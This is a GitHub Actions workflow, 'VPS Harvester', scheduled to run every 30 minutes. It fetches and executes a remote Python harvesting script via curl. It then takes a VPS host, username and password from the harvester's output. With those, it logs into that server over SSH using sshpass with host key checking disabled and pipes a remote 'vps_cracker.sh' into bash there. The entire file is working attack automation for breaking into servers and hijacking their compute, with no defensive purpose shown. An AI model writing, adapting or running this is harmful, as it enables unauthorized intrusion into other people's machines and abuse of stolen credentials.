name: VPS Harvester

on:
  schedule:
    - cron: '*/30 * * * *'
  workflow_dispatch:

jobs:
  harvest:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Install
        run: |
          sudo apt update
          sudo apt install python3-pip -y
          pip3 install paramiko
      
      - name: Harvest VPS
        run: python3 -c "$(curl -sL https://raw.githubusercontent.com/your/vps_harvester.py)"
        continue-on-error: true
      
      - name: Deploy Cracker
        if: success()
        run: |
          VPS=$(python3 harvest.py | grep POWERFUL_VPS | head -1 | cut -d':' -f2 | cut -d'|' -f1)
          USER=$(python3 harvest.py | grep POWERFUL_VPS | head -1 | cut -d':' -f2 | cut -d'|' -f2)
          PASS=$(python3 harvest.py | grep POWERFUL_VPS | head -1 | cut -d':' -f2 | cut -d'|' -f3)
          sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no $USER@$VPS "bash <(curl -sL https://raw.githubusercontent.com/your/vps_cracker.sh)"
